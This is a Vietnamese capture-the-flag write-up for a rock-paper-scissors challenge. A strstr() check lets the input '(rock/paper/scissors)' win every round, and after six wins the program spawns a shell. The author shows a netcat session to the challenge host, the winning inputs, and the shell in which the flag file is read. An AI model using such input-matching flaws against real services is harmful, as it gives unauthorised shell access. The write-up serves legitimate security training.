Đọc source code ta có thấy chương trình sử dụng `if (strstr(player_turn, loses[computer_turn]))` hàm strstr() để kiểm tra chuỗi người dùng nhập vào `player_turn` có 
trong chuỗi `loses[computer_turn]` máy tính thua không.
Nếu có sẽ trả về `true` từ đó ta có 1 lần chiến thắng.
```
if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
```
Tận dụng lỗi này ta sẽ nhập `{"rock", "paper", "scissors"}` 6 lần để có thể chiến thắng.
```
 if (wins >= 6) {
        puts("Congrats!!!");
        system("/bin/sh");
	
      }
```
Chúng ta sẽ connect đến `netcat` để thực hiện 6 lần nhập sau đó khi chương trình gọi `/bin/sh` ta sẽ lấy được `shell`.
```
halston in ~ λ nc 174.138.21.217 3138
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: scissors
You win! Play again?
Congrats!!!
ls
bin
chall
dev
flag.txt
ld.so
lib
lib32
lib64
libc.so.6
cat flag.xtt
cat: flag.xtt: No such file or directory
cat flag.txt
ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}
```
